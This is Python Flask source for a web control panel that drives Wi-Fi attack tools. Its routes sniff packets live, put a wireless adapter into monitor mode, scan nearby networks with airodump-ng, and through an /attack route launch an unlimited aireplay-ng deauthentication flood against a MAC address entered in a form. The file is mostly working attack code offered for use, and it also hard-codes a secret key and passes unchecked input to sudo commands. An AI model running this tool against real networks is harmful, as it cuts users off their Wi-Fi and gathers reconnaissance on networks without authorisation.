from flask import Flask, render_template, request , jsonify, make_response
import subprocess
import re
import pyshark
from flask_socketio import SocketIO
import time
import csv
import glob
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
socketio = SocketIO(app)
csv_data = []

current_interface = None
capture = None

@app.route("/")
def home():
    # Run the neofetch command and capture its output
    output = subprocess.check_output(['neofetch', '--stdout'])

    # Convert the output to a string and pass it to the template
    return render_template('index.html', system_info=output.decode('utf-8'))

@app.route("/live", methods=['GET', 'POST'])
def live():
    if request.method == 'POST':
        selected_interface = request.form.get('interface')
        socketio.emit('start_capture' , selected_interface)
        return render_template('live.html', selected_interface=selected_interface)
    interfaces = get_network_interfaces()
    return render_template('live.html', interfaces=interfaces, selected_interface=current_interface)

def get_network_interfaces():
    output = subprocess.check_output(['ifconfig']).decode('utf-8')
    interface_lines = re.findall(r'^([a-zA-Z0-9]+):', output, re.MULTILINE)
    interfaces = [line.strip(':') for line in interface_lines]
    return interfaces

def capture_packets(interface):
    capture = pyshark.LiveCapture(interface=interface)
    packet_counter = 0
    for packet in capture.sniff_continuously():
        packet_data = {
            'time': packet.frame_info.time,
            'source': packet.ip.src if 'ip' in packet else '',
            'destination': packet.ip.dst if 'ip' in packet else '',
            'protocol': packet.layers[0]._layer_name if packet.layers else ''
        }
        socketio.emit('packet', packet_data, namespace='/')

        packet_counter += 1
        if packet_counter >= 25:
            break
        time.sleep(0.5)


@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('start_capture')
def handle_start_capture(interface):
    print(f'Starting packet capture for interface: {interface}')
    socketio.start_background_task(capture_packets, interface)


@app.route("/config", methods=["GET", "POST"])
def config():
    result = ""
    if request.method == "POST":
        mode = request.form.get("mode")
        command = []
        if mode == "monitor":
            command = [
                "airmon-ng",
                "start",
                "wlan1",
            ]  # Replace 'wlan0' with your wireless adapter name
        elif mode == "managed":
            command = [
                "airmon-ng",
                "stop",
                "wlan1",
            ]  # Replace 'wlan0' with your wireless adapter name
        else:
            return render_template("config.html", result="wrong mode")
        result =  mode.capitalize()
        try:
            subprocess.run(command, check=True)
            result = f"Device set to {result} mode"
        except Exception as error:
            print(error)
            result = f"Error configuring {result} mode"
    return render_template("config.html", result= result)


@app.route("/status")
def status():
    # Check if wireless adapter is in monitor or managed mode
    output = subprocess.check_output(['iwconfig', 'wlp0s20f3']).decode('utf-8')
    adapter_status = re.findall(r'Mode:(.*?)  ', output, re.MULTILINE)[0]

    return render_template("status.html", adapter_status=adapter_status)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    # Deauthentication attack logic
    interface = 'wlan1'  # Replace 'wlan0' with your wireless adapter name
    target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input
    target_channel = request.form.get('target_channel', '')  # Get the target channel from the form input
    result=""
    output=""
    if request.method == 'POST' and target_mac:
        # Execute the deauthentication attack command
        deauth_command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
        
        # Set the target channel using the sudo iw command
        channel_command = ['sudo', 'iw', interface, 'set', 'channel', target_channel]
        
        try:
            # Set the channel
            subprocess.run(channel_command, check=True)
            
            # Execute the deauthentication attack
            output = subprocess.check_output(deauth_command, stderr=subprocess.STDOUT, universal_newlines=True)
            result = "Deauthentication attack completed"
        except subprocess.CalledProcessError as e:
            output = e.output
            result = "Failed to execute deauthentication attack"
    
    return render_template("attack.html", result=result, output=output)

@app.route('/dump', methods=['GET', 'POST'])
def dump():
    global csv_data

    if request.method == 'POST':
        # Run airodump-ng command for 25 seconds
        command = ['sudo', 'airodump-ng', '--manufacturer', '--wps', '-w', 'airodump_output', '--output-format', 'csv', 'wlan1']
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        countdown = 25

        while countdown > 0:
            time.sleep(1)
            countdown -= 1

        process.terminate()

        message = 'Airodump CSV file has been generated.'

        # Read the generated CSV file
        csv_data = []
        csv_files = glob.glob('*.csv')

        # Sort the files by their creation time in descending order
        csv_files.sort(key=os.path.getctime, reverse=True)

        # Select the most recent .csv file
        if csv_files:
            most_recent_csv = csv_files[0]

            # Open the most recent .csv file
            with open(most_recent_csv, 'r') as file:
                csv_reader = csv.reader(file)
                for row in csv_reader:
                    csv_data.append(row)
        else:
            # Handle the case when no .csv files are found
            print("No .csv files found in the current directory.")

        response = make_response(render_template('dump.html', message=message, csv_data=csv_data, show_csv_button=True))
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response

    return render_template('dump.html', csv_data=csv_data, show_csv_button=True)



@app.route('/show_csv')
def show_csv():
    if not csv_data:
        return 'No CSV data available.'

    return jsonify(csv_data)

if __name__ == "__main__":
    socketio.run(app)
